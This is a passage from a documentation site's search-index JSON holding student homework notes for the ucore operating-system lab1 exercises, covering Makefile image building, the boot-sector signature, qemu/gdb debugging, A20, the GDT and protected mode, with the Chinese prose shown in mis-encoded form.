ä¿¡å·é‡çš„å¦ä¸€ç§ç”¨é€”æ˜¯å®ç°åŒæ­¥ (synchronization)ã€‚\näº’æ–¥é‡ #  å¦‚æœä¸éœ€è¦ä¿¡å·é‡çš„è®¡æ•°èƒ½åŠ›ï¼Œæœ‰æ—¶å¯ä»¥ä½¿ç”¨ä¿¡å·é‡çš„ç®€åŒ–ç‰ˆæœ¬äº’æ–¥é‡ (mutex)ã€‚å®ƒä»…ä»…é€‚ç”¨äºç®¡ç†æˆ–å…±äº«ä¸€å°æ®µä»£ç ï¼Œå› ä¸ºäº’æ–¥é‡å®ç°æ—¶æ—¢å®¹æ˜“åˆæœ‰æ•ˆï¼Œè¿™åœ¨å®ç°ç”¨æˆ·çº¿ç¨‹åŒ…çš„æ—¶å€™éå¸¸æœ‰ç”¨ã€‚\n"},{"id":288,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe1/","title":"Exe1","section":"lab1","content":"exe1 #  make #  makeå‘½ä»¤æ‰§è¡Œéœ€è¦ä¸€ä¸ªmakefileæ–‡ä»¶ï¼Œä»¥å‘Šè¯‰makeå‘½ä»¤éœ€è¦å¦‚ä½•å»ç¼–è¯‘å’Œé“¾æ¥ç¨‹åºã€‚\n å¦‚æœå·¥ç¨‹æ²¡æœ‰è¢«ç¼–è¯‘è¿‡ï¼Œæ‰€æœ‰çš„cæ–‡ä»¶éƒ½è¦ç¼–è¯‘å¹¶è¢«é“¾æ¥ã€‚ å¦‚æœæŸå‡ ä¸ªcæ–‡ä»¶è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆåªç¼–è¯‘è¢«ä¿®æ”¹çš„cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åºã€‚ å¦‚æœå·¥ç¨‹çš„å¤´æ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆéœ€è¦ç¼–è¯‘å¼•ç”¨äº†è¿™å‡ ä¸ªå¤´æ–‡ä»¶çš„cæ–‡ä»¶ï¼Œå¹¶é“¾æ¥ç›®æ ‡ç¨‹åº  target... : prerequisites... command ... ... targetä¹Ÿå°±æ˜¯ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯object file,ä¹Ÿå¯ä»¥æ˜¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿˜å¯ä»¥æ˜¯ä¸€ä¸ªlabelã€‚prerequisiteså°±æ˜¯è¦ç”Ÿæˆtargetæ‰€éœ€è¦çš„æ–‡ä»¶æˆ–æ˜¯ç›®æ ‡ã€‚commandå°±æ˜¯makeéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚targetè¿™ä¸€ä¸ªæˆ–å¤šä¸ªçš„ç›®æ ‡æ–‡ä»¶ä¾èµ–äºprerequisitesä¸­çš„æ–‡ä»¶ï¼Œå…¶ç”Ÿæˆè§„åˆ™å®šä¹‰åœ¨commandä¸­ã€‚å¦‚æœprerequisitesä¸­æœ‰ä¸€ä¸ªä»¥ä¸Šçš„æ–‡ä»¶æ¯”targetæ–‡ä»¶è¦æ–°ï¼Œé‚£ä¹ˆcommandæ‰€å®šä¹‰çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œã€‚\né—®é¢˜ 1 #   æ“ä½œç³»ç»Ÿé•œåƒæ–‡ä»¶ucore.imgæ˜¯å¦‚ä½•ä¸€æ­¥ä¸€æ­¥ç”Ÿæˆçš„?(éœ€è¦æ¯”è¾ƒè¯¦ç»†åœ°è§£é‡ŠMakefileä¸­æ¯ ä¸€æ¡ç›¸å…³å‘½ä»¤å’Œå‘½ä»¤å‚æ•°çš„å«ä¹‰,ä»¥åŠè¯´æ˜å‘½ä»¤å¯¼è‡´çš„ç»“æœ)\n ucore.img #  makefileä¸­ç”Ÿæˆucore.imgçš„ä»£ç ä¸ºï¼š\nUCOREIMG\t:= $(call totarget,ucore.img)  $(UCOREIMG): $(kernel) $(bootblock) \t$(V)dd if=/dev/zero of=$@ count=10000 \t$(V)dd if=$(bootblock) of=$@ conv=notrunc \t$(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc  $(call create_target,ucore.img) å°†ucore.imgä¼ å…¥totargetè¡¨è¾¾å¼è°ƒç”¨callå‡½æ•°ç»“æœèµ‹å€¼ç»™å˜é‡UCOREIMGï¼ŒUCOREIMGä½œä¸ºtargetï¼Œå…¶ä¾èµ–äºä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯kernelï¼Œä¸€ä¸ªæ˜¯bootblockã€‚æ¥ä¸‹æ¥ç»™å‡ºmakeéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚é¦–å…ˆä»/dev/zeroä¸­è¯»äº†10000*512å—çš„ç©ºå­—èŠ‚ï¼Œç”Ÿæˆç©ºæ–‡ä»¶ï¼Œæ¥ç€å°†bootlockä¸­çš„å†…å®¹æ‹·è´åˆ°ç›®æ ‡æ–‡ä»¶ï¼Œç„¶åä»è¾“æ–‡ä»¶çš„512å­—èŠ‚åç»§ç»­å†™å…¥kernelçš„å†…å®¹ã€‚makefileçš„ç¬¬å…­è¡ŒV := @å°†@èµ‹å€¼ç»™å˜é‡Vï¼Œæ‰€ä»¥$(V)ä»£æŒ‡@,è¡¨ç¤ºå‘½ä»¤ä¸å›æ˜¾ã€‚conv=notruncä»£è¡¨ä¸æˆªæ–­è¾“å‡ºæ–‡ä»¶ï¼Œcount=nâ€™ ä»£è¡¨ä»è¾“å…¥æ–‡ä»¶ä¸­æ‹·è´nä¸ªå¤§å°ä¸ºibs byteçš„å—ï¼Œibsé»˜è®¤ä¸º512å­—èŠ‚ã€‚seek=nä»£è¡¨åœ¨æ‹·è´å‰è¾“å‡ºæ–‡ä»¶æ—¶è·³è¿‡n ä¸ªâ€˜obsâ€™-byteçš„å—ã€‚obsé»˜è®¤ä¸º512å­—èŠ‚ã€‚æ‰€ä»¥seek=1ä»£è¡¨è·³è¿‡è¾“å‡ºæ–‡ä»¶çš„512ä¸ªå­—èŠ‚ã€‚\nkenelï¼š\nkernel = $(call totarget,kernel)  $(kernel): tools/kernel.ld  $(kernel): $(KOBJS) \t@echo + ld $@ \t$(V)$(LD) $(LDFLAGS) -T tools/kernel.ld -o $@ $(KOBJS) \t@$(OBJDUMP) -S $@ \u0026gt; $(call asmfile,kernel) \t@$(OBJDUMP) -t $@ | $(SED) \u0026#39;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d\u0026#39; \u0026gt; $(call symfile,kernel)  $(call create_target,kernel) kernelçš„ç”Ÿæˆä¾èµ–äºKOBJSå’Œtools/kernel.ldï¼Œç”Ÿæˆå‘½ä»¤ä¾èµ–äºi386-elf-objdump ã€ldå’Œobjdumpç­‰ã€‚\nç¬¬äº”è¡Œé“¾æ¥å„ç§æ–‡ä»¶è¾“å‡ºç»™ç›®æ ‡æ–‡ä»¶ï¼Œç¬¬å…­è¡Œåæ±‡ç¼–ç›®æ ‡æ–‡ä»¶è¾“å‡ºç»™asmfileè¿™ä¸ªå˜é‡ã€‚ç¬¬ä¸ƒè¡Œè¾“å‡ºç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨å¹¶è¿›è¡Œæ–‡æœ¬æ›¿æ¢ã€‚æœ€åå†™å…¥symfileè¿™ä¸ªå˜é‡ã€‚\nbootblock #  bootfiles = $(call listf_cc,boot) $(foreach f,$(bootfiles),$(call cc_compile,$(f),$(CC),$(CFLAGS) -Os -nostdinc)) bootblock = $(call totarget,bootblock) $(bootblock): $(call toobj,$(bootfiles)) | $(call totarget,sign)  @echo + ld $@  $(V)$(LD) $(LDFLAGS) -N -e start -Ttext 0x7C00 $^ -o $(call toobj,bootblock)  @$(OBJDUMP) -S $(call objfile,bootblock) \u0026gt; $(call asmfile,bootblock)  @$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock)  @$(call totarget,sign) $(call outfile,bootblock) $(bootblock) $(call create_target,bootblock) bootblock ä¾èµ–äºbootasm.oã€bootmain.oã€signç”Ÿæˆbootblockçš„ç¼–è¯‘æŒ‡ä»¤ä¸ºï¼š\nld -m elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o  -m æ¨¡æ‹Ÿä¸ºi386ä¸Šçš„è¿æ¥å™¨ -nostdlib ä¸ä½¿ç”¨æ ‡å‡†åº“ -N è®¾ç½®ä»£ç æ®µå’Œæ•°æ®æ®µå‡å¯è¯»å†™ -e æŒ‡å®šå…¥å£ -Ttext åˆ¶å®šä»£ç æ®µå¼€å§‹ä½ç½® -fno-builtin:é™¤éç”¨__builtin_å‰ç¼€ï¼Œå¦åˆ™ä¸è¿›è¡Œbuiltinå‡½æ•°çš„ä¼˜åŒ–  é—®é¢˜ 2 #   ä¸€ä¸ªè¢«ç³»ç»Ÿè®¤ä¸ºæ˜¯ç¬¦åˆè§„èŒƒçš„ç¡¬ç›˜ä¸»å¼•å¯¼æ‰‡åŒºçš„ç‰¹å¾æ˜¯ä»€ä¹ˆ?\n sign:å¤–éƒ¨æ‰§è¡Œç¨‹åº,ç”¨æ¥ç”Ÿæˆè™šæ‹Ÿçš„ç¡¬ç›˜ä¸»å¼•å¯¼æ‰‡åŒº\nä»sign.cä»£ç ä¸­ï¼š\nif (st.st_size \u0026gt; 510) {  fprintf(stderr, \u0026#34;%lld \u0026gt;\u0026gt; 510!!\\n\u0026#34;, (long long)st.st_size);  return -1; } ... buf[510] = 0x55; buf[511] = 0xAA; ä¸»å¼•å¯¼æ‰‡åŒºæœ‰512ä¸ªå­—èŠ‚ï¼Œç¬¬511å­—èŠ‚å†™å…¥0x55ï¼Œç¬¬512å­—èŠ‚å†™å…¥0xAAã€‚\n"},{"id":289,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe2/","title":"Exe2","section":"lab1","content":"exe2 #  ä½¿ç”¨ qemu æ‰§è¡Œå¹¶è°ƒè¯• lab1 ä¸­çš„è½¯ä»¶ã€‚\nä¸ºäº†æ›´åŠ ç®€æ˜“åœ°å¯¹ gdb è¿›è¡Œè°ƒè¯•ï¼Œæˆ‘ä»¬åº”è¯¥å®‰è£… pedaã€‚ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªå†…æ ¸è°ƒè¯•çš„ç‰ˆæœ¬å¹¶ä¸èƒ½æ˜¾ç¤ºé¢œè‰²ï¼Œå¾ˆå¤šä¹±ç ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚\nSTEP-1 #   ä» CPU åŠ ç”µåæ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¼€å§‹ï¼Œå•æ­¥è·Ÿè¸ª BIOS çš„æ‰§è¡Œ\n å¯ä»¥åœ¨ Makefile çš„ç¬¬ 219-222 è¡Œçœ‹åˆ° make åˆ—ä¸¾çš„å‘½ä»¤ä¸­ï¼Œæœ‰ä¸€ä¸ªå«åš debug çš„å‘½ä»¤ï¼š\ndebug: $(UCOREIMG) \t$(V)$(QEMU) -S -s -parallel stdio -hda $\u0026lt; -serial null \u0026amp; \t$(V)sleep 2 \t$(V)$(TERMINAL) -e \u0026#34;gdb -q -tui -x tools/gdbinit\u0026#34; è¿™ä¸‰è¡Œå‘½ä»¤åˆ†åˆ«æ‰§è¡Œï¼š\n  ä½¿ç”¨ qemu è¿è¡Œ 32 ä½ç¨‹åºçš„è™šæ‹Ÿæœºï¼Œè¿™ä¸ªå˜é‡å€¼åœ¨ Makefile çš„ 27 è¡Œè¿›è¡Œèµ‹å€¼ï¼Œåœ¨æˆ‘çš„ Ubuntu ä¸­è¿™ä¸ªå˜é‡çš„æœ€ç»ˆèµ‹å€¼æ˜¯ qemu-system-i386ã€‚è¦æŸ¥çœ‹ä¸Šé¢å„ä¸ªå‘½ä»¤çš„å«ä¹‰ä½¿ç”¨ manual å³å¯ï¼š\n$ qemu-system-i386 --help ä½¿ç”¨åˆ°çš„é€‰é¡¹å«ä¹‰å¦‚ä¸‹ï¼š\n -Sï¼š åœ¨å¯åŠ¨æ—¶ä¸å¯åŠ¨ CPUï¼Œ éœ€è¦åœ¨ monitor ä¸­è¾“å…¥ cï¼Œæ‰èƒ½è®© qemu ç»§ç»­æ¨¡æ‹Ÿå·¥ä½œã€‚ -sï¼šç­‰å¾… gdb è¿æ¥åˆ°ç«¯å£ 1234ï¼› -hda $\u0026lt;ï¼šä½¿ç”¨ $\u0026lt; ä½œä¸ºç¡¬ç›˜0ã€1ã€2ã€3é•œåƒã€‚å…¶ä¸­ $\u0026lt; æŒ‡ç¬¬ä¸€ä¸ªä¾èµ–ï¼Œä¹Ÿå°±æ˜¯ $(UCOREIMG)ï¼› -parallel stdioï¼šé‡å®šå‘è™šæ‹Ÿå¹¶å£åˆ°ä¸»æœºè®¾å¤‡ studio ä¸­ï¼› -serial nullï¼šä¸é‡å®šå‘è™šæ‹Ÿä¸²å£åˆ°ä¸»æœºè®¾å¤‡ã€‚    sleep 2ï¼šç¨‹åºä¼‘çœ ä¸¤ç§’é’Ÿï¼›\n  ç¬¬ä¸‰è¡Œä»¥æ‰§è¡Œ gdb çš„æ–¹å¼ï¼Œæ‰“å¼€ä¸€ä¸ªç»ˆç«¯ï¼Œå…¶ä¸­ä½¿ç”¨ tools/gdbinit ä½œä¸ºåˆå§‹åŒ–é…ç½®ã€‚\n  æ ¹æ®é™„å½•ä¸­çš„å†…å®¹ï¼Œä¸€é¡¿çæ“ä½œï¼Œæˆ‘ä»¬éœ€è¦æŠŠ ./tools/gdbinit æ”¹æˆä¸‹é¢çš„æ ·å­ï¼š\n# ./tools/gdbinit set architecture i8086 target remote :1234  define hook-stop x /i (($cs \u0026lt;\u0026lt; 4) + $pc) end   å‰é¢ä¸¤è¡Œçš„æ„æ€æ˜¯ï¼šå‘Šè¯‰ gdb è®¾ç½® 32 ä½ç¨‹åºï¼Œå¹¶ä¸”æŠŠ gdb é€šè¿‡ 1234 ç½‘ç»œç«¯å£é“¾æ¥åˆ° qemuï¼›\n  åé¢ä¸‰è¡Œçš„æ„æ€æ˜¯ï¼šåŠ å…¥ä¸€ä¸ªåœæ­¢çš„é’©å­ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡åœæ­¢æ—¶ä¼šæ‰§è¡Œä¸­é—´çš„è¯­å¥ï¼›\n  åŸæœ¬çš„é¢˜ç›®ä¸­ç»™å‡ºçš„è¯­å¥æ˜¯ x /i $pcã€‚ä½†æ˜¯æ ¹æ®é™„å½•ä¸­çš„æç¤ºï¼ŒçœŸå®çš„æ‰§è¡Œä½ç½®æ˜¯è™šæ‹Ÿå¾—åˆ°çš„ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ $cs. å¯„å­˜å™¨ä¸ $pc å¯„å­˜å™¨è®¡ç®—è€Œæ¥ï¼Œå› æ­¤æˆ‘ä»¬å¾—åˆ°äº†ä¸Šé¢çš„è¯­å¥ã€‚\n  æœ€åæˆ‘ä»¬åœ¨ bash ä¸­æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å°±å¯ä»¥äº†ï¼š\n$ make debug æˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡æ²¡æœ‰ hook åˆ° stopï¼Œéœ€è¦æ‰‹åŠ¨æ˜¾ç¤ºï¼š\n0x0000fff0 in ?? () (gdb) x /i (($cs \u0026lt;\u0026lt; 4) + $pc)  0xffff0: ljmp $0xf000,$0xe05b å¯ä»¥çœ‹åˆ° CPU åŠ ç”µåçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯ ljmp é•¿è½¬ç§»æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯ 0xfe05b ä½ç½®çš„æŒ‡ä»¤ã€‚\nSTEP-2 \u0026amp; STEP-3 #   åœ¨åˆå§‹åŒ–ä½ç½® 0x7c00 è®¾ç½®å®åœ°å€æ–­ç‚¹,æµ‹è¯•æ–­ç‚¹æ­£å¸¸ã€‚\nä» 0x7c00 å¼€å§‹è·Ÿè¸ªä»£ç è¿è¡Œ,å°†å•æ­¥è·Ÿè¸ªåæ±‡ç¼–å¾—åˆ°çš„ä»£ç ä¸ bootasm.S. å’Œ bootblock.asm è¿›è¡Œæ¯”è¾ƒã€‚\n æ›´æ”¹ ./tools/gdbinit ä¸ºä¸‹é¢çš„å½¢å¼ï¼š\n# ./tools/gdbinit set architecture i8086 target remote :1234  define hook-stop x /10i (($cs \u0026lt;\u0026lt; 4) + $pc) end  break *0x7c00 continue å¯ä»¥çœ‹åˆ°å®ƒå¾—åˆ°çš„åæ±‡ç¼–ä»£ç ï¼š\n=\u0026gt; 0x7c00: cli 0x7c01: cld 0x7c02: xor %ax,%ax 0x7c04: mov %ax,%ds 0x7c06: mov %ax,%es 0x7c08: mov %ax,%ss 0x7c0a: in $0x64,%al 0x7c0c: test $0x2,%al 0x7c0e: jne 0x7c0a 0x7c10: mov $0xd1,%al 0x7c12: out %al,$0x64 0x7c14: in $0x64,%al 0x7c16: test $0x2,%al 0x7c18: jne 0x7c14 0x7c1a: mov $0xdf,%al 0x7c1c: out %al,$0x60 0x7c1e: lgdtw 0x7c6c 0x7c23: mov %cr0,%eax 0x7c26: or $0x1,%eax 0x7c2a: mov %eax,%cr0 boot/bootasm.S çš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n#include \u0026lt;asm.h\u0026gt; # Start the CPU: switch to 32-bit protected mode, jump into C. # The BIOS loads this code from the first sector of the hard disk into # memory at physical address 0x7c00 and starts executing in real mode # with %cs=0 %ip=7c00. .set PROT_MODE_CSEG, 0x8 # kernel code segment selector .set PROT_MODE_DSEG, 0x10 # kernel data segment selector .set CR0_PE_ON, 0x1 # protected mode enable flag # start address should be 0:7c00, in real mode, the beginning address of the running bootloader .globl start start: .code16 # Assemble for 16-bit mode cli # Disable interrupts cld # String operations increment # Set up the important data segment registers (DS, ES, SS). xorw %ax, %ax # Segment number zero movw %ax, %ds # -\u0026gt; Data Segment movw %ax, %es # -\u0026gt; Extra Segment movw %ax, %ss # -\u0026gt; Stack Segment # Enable A20: # For backwards compatibility with the earliest PCs, physical # address line 20 is tied low, so that addresses higher than # 1MB wrap around to zero by default. This code undoes this. seta20.1: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.1 movb $0xd1, %al # 0xd1 -\u0026gt; port 0x64 outb %al, $0x64 # 0xd1 means: write data to 8042\u0026#39;s P2 port seta20.2: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.2 movb $0xdf, %al # 0xdf -\u0026gt; port 0x60 outb %al, $0x60 # 0xdf = 11011111, means set P2\u0026#39;s A20 bit(the 1 bit) to 1 # Switch from real to protected mode, using a bootstrap GDT # and segment translation that makes virtual addresses # identical to physical addresses, so that the # effective memory map does not change during the switch. lgdt gdtdesc movl %cr0, %eax orl $CR0_PE_ON, %eax movl %eax, %cr0 # Jump to next instruction, but in 32-bit code segment. # Switches processor into 32-bit mode. ljmp $PROT_MODE_CSEG, $protcseg .code32 # Assemble for 32-bit mode protcseg: # Set up the protected-mode data segment registers movw $PROT_MODE_DSEG, %ax # Our data segment selector movw %ax, %ds # -\u0026gt; DS: Data Segment movw %ax, %es # -\u0026gt; ES: Extra Segment movw %ax, %fs # -\u0026gt; FS movw %ax, %gs # -\u0026gt; GS movw %ax, %ss # -\u0026gt; SS: Stack Segment # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00) movl $0x0, %ebp movl $start, %esp call bootmain # If bootmain returns (it shouldn\u0026#39;t), loop. spin: jmp spin # Bootstrap GDT .p2align 2 # force 4 byte alignment gdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernel gdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt äºŒè€…æ˜¯ç›¸åŒçš„ï¼Œä¸ ./obj/bootblock.asm ä¸­çš„ä»£ç ä¹Ÿæ˜¯ç›¸åŒçš„ã€‚\nä» boot/bootasm.S å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ï¼š\n åˆå§‹åŒ–æ•°æ®æ®µã€é¢å¤–æ®µã€æ ˆåŒºç­‰ï¼› è¿›è¡Œä¸æ—©æœŸ PC å…¼å®¹çš„æ“ä½œï¼Œå¦‚æœåœ°å€çº¿è¶…è¿‡æ€»çº¿é•¿ï¼Œé«˜ä½ä¼šè¢«æ¸…é›¶ï¼› ä»å®æ¨¡å¼åˆ‡æ¢åˆ°ä¿æŠ¤æ¨¡å¼ï¼Œä½¿å¾—ç‰©ç†åœ°å€è¡¨ç¤ºè½¬æ¢ä¸ºè™šæ‹Ÿåœ°å€è¡¨ç¤ºã€‚  STEP-4 #   è‡ªå·±æ‰¾ä¸€ä¸ªbootloaderæˆ–å†…æ ¸ä¸­çš„ä»£ç ä½ç½®ï¼Œè®¾ç½®æ–­ç‚¹å¹¶è¿›è¡Œæµ‹è¯•ã€‚\n å‚è€ƒ git ç‰ˆæœ¬ä»“åº“ä¸­ HEAD çš„ gdbinit ç‰ˆæœ¬ï¼š\nfile bin/kernel target remote :1234 break kern_init continue è¿™ä¸ªç‰ˆæœ¬ break åœ¨äº† kern_init è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æœ‰æºç è¿›è¡Œ debugã€‚\n"},{"id":290,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe3/","title":"Exe3","section":"lab1","content":"exe3 #  é—®é¢˜1 #   ä¸ºä½•å¼€å¯ A20,ä»¥åŠå¦‚ä½•å¼€å¯ A20\n ä¸ºäº†ä¸æ—©æœŸçš„pcæœºå…¼å®¹ï¼Œç‰©ç†åœ°å€çº¿20(å®æ¨¡å¼)ç½®äºä½ä½ä¸èƒ½ä½¿ç”¨ã€‚æ‰€ä»¥è¶…è¿‡1MBçš„åœ°å€ï¼Œé»˜è®¤å°±ä¼šè¿”å›åˆ°åœ°å€0ã€‚å¯»å€ç©ºé—´åªæœ‰1MBã€‚\nå¼€å¯A20ï¼š\nseta20.1: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.1 movb $0xd1, %al # 0xd1 -\u0026gt; port 0x64 outb %al, $0x64 # 0xd1 means: write data to 8042\u0026#39;s P2 port ä»0x64ç«¯å£è¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°alä¸­ï¼Œå¦‚æœa1ç¬¬äºŒä½ä¸ä¸º0ï¼Œåˆ™è·³è½¬åˆ°seta20.1æ¥ç€æ‰§è¡Œæ£€æŸ¥a1çš„ç¬¬äºŒä½æ˜¯ä¸æ˜¯0ã€‚å°†0xd1å†™å…¥åˆ°alä¸­ï¼Œå†å°†alä¸­çš„æ•°æ®å†™å…¥åˆ°ç«¯å£0x64ä¸­ã€‚\nseta20.2: inb $0x64, %al # Wait for not busy(8042 input buffer empty). testb $0x2, %al jnz seta20.2 movb $0xdf, %al # 0xdf -\u0026gt; port 0x60 outb %al, $0x60 # 0xdf = 11011111, means set P2\u0026#39;s A20 bit(the 1 bit) to 1 ä»0x64ç«¯å£è¯»å…¥ä¸€ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°alä¸­ï¼Œå¦‚æœa1ç¬¬äºŒä½ä¸ä¸º0ï¼Œåˆ™è·³è½¬åˆ°seta20.2æ¥ç€æ‰§è¡Œæ£€æŸ¥a1çš„ç¬¬äºŒä½æ˜¯ä¸æ˜¯0ã€‚å°†0xdfå†™å…¥åˆ°alä¸­ï¼Œå†å°†alä¸­çš„æ•°æ®å†™å…¥åˆ°ç«¯å£0x60ä¸­ã€‚\n å¦‚ä½•åˆå§‹åŒ–GDTè¡¨\n #define SEG_NULLASM \\ .word 0, 0; \\ .byte 0, 0, 0, 0 #define SEG_ASM(type,base,lim) \\ .word (((lim) \u0026gt;\u0026gt; 12) \u0026amp; 0xffff), ((base) \u0026amp; 0xffff); \\ .byte (((base) \u0026gt;\u0026gt; 16) \u0026amp; 0xff), (0x90 | (type)), \\ (0xC0 | (((lim) \u0026gt;\u0026gt; 28) \u0026amp; 0xf)), (((base) \u0026gt;\u0026gt; 24) \u0026amp; 0xff) gdt: SEG_NULLASM # null seg SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff) # code seg for bootloader and kernel SEG_ASM(STA_W, 0x0, 0xffffffff) # data seg for bootloader and kernel #åˆå§‹åŒ–ç©ºæ®µï¼Œä»£ç æ®µå’Œæ•°æ®æ®µ gdtdesc: .word 0x17 # sizeof(gdt) - 1 .long gdt # address gdt #gdtå¤§å°å’Œåœ°å€ åœ¨è¯¥æ–‡ä»¶çš„ç¬¬åè¡Œå®šä¹‰äº† CR0_PE_ON å˜é‡ç­‰äº 1 ,åŠ è½½å…¨å±€æè¿°ç¬¦å¯„å­˜å™¨gdtrï¼Œé€šè¿‡lgdtæŒ‡ä»¤å°†å…¨å±€æè¿°ç¬¦å…¥å£åœ°å€è£…å…¥gdtrå¯„å­˜å™¨ä¸­ã€‚ç„¶åå°†æ§åˆ¶å¯„å­˜å™¨cr0çš„å€¼è£…è½½å…¥eaxä¸­ï¼Œå°†eaxçš„å€¼è®¾ç½®ä¸º1ï¼Œç„¶åå°†eaxçš„å€¼è£…è½½å…¥cr0ä¸­ï¼Œcr0ä¸º1æ—¶ä»£è¡¨è¿›å…¥ä¿æŠ¤æ¨¡å¼ã€‚\n å¦‚ä½•ä½¿èƒ½å’Œè¿›å…¥ä¿æŠ¤æ¨¡å¼\n ç¿»è¯‘ä¸‹é¢ä»£ç æ³¨é‡Šå¾—åˆ°ä»¥ä¸‹ç»“è®º\nlgdt gdtdesc movl %cr0, %eax orl $CR0_PE_ON, %eax movl %eax, %cr0 å…ˆå°†A20å¼€å¯è¿›å…¥32ä½å¯»å€æ¨¡å¼ï¼Œç„¶ååˆå§‹åŒ–GDTè¡¨ï¼Œç„¶åè®¾ç½®cr0æ§åˆ¶å¯„å­˜å™¨ä¸º1ï¼Œè¡¨ç¤ºè¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼Œç„¶åè·³è½¬åˆ°32ä½æ¨¡å¼ä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤å°†å¤„ç†å™¨åˆ‡æ¢ä¸º32ä½å·¥ä½œæ¨¡å¼ï¼Œè®¾ç½®æ•°æ®æ®µå¯„å­˜å™¨ï¼Œè®¾ç½®æ ˆæŒ‡é’ˆï¼Œå¹¶ä¸”è°ƒç”¨bootmainå‡½æ•°ã€‚\n# Jump to next instruction, but in 32-bit code segment. # Switches processor into 32-bit mode. ljmp $PROT_MODE_CSEG, $protcseg .code32 # Assemble for 32-bit mode protcseg: # Set up the protected-mode data segment registers movw $PROT_MODE_DSEG, %ax # Our data segment selector movw %ax, %ds # -\u0026gt; DS: Data Segment movw %ax, %es # -\u0026gt; ES: Extra Segment movw %ax, %fs # -\u0026gt; FS movw %ax, %gs # -\u0026gt; GS movw %ax, %ss # -\u0026gt; SS: Stack Segment # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00) movl $0x0, %ebp movl $start, %esp call bootmain "},{"id":291,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/homework/lab1/exe4/","title":"Exe4","section":"lab1","content":"exe4 #   åˆ†æ bootloader åŠ è½½ ELF æ ¼å¼çš„ OS çš„è¿‡ç¨‹\n bootmian.c #  è®©æˆ‘ä»¬ç®€å•åœ°ç¿»è¯‘ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æ³¨é‡Šï¼š\nç£ç›˜å†…å­˜å¸ƒå±€ï¼š\n è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ªå¯åŠ¨åŠ è½½å™¨ (bootloader)ï¼Œå®ƒåº”è¯¥åœ¨ç£ç›˜çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸Šï¼› ç´§æ¥ç€çš„ç¬¬äºŒä¸ªæ‰‡åŒºå­˜å‚¨ç€å†…æ ¸çš„é•œåƒï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ª ELF æ ¼å¼çš„æ–‡ä»¶ã€‚  å¯åŠ¨çš„æµç¨‹ï¼š\n å½“ CPU å¯åŠ¨æ—¶ï¼Œå®ƒé¦–å…ˆå°† BIOS åŠ è½½è¿›å†…å­˜ä¸­ï¼Œç„¶åæ‰§è¡Œå®ƒï¼› ç„¶å BIOS ä¼šåˆå§‹åŒ–ä¸­æ–­å‘¨æœŸï¼Œç„¶åå–å‡ºå¯åŠ¨ç¨‹åºçš„ç¬¬ä¸€ä¸ªé€‰åŒºç„¶åè·³è½¬åˆ°å®ƒï¼› å¦‚æœå¯åŠ¨åŠ 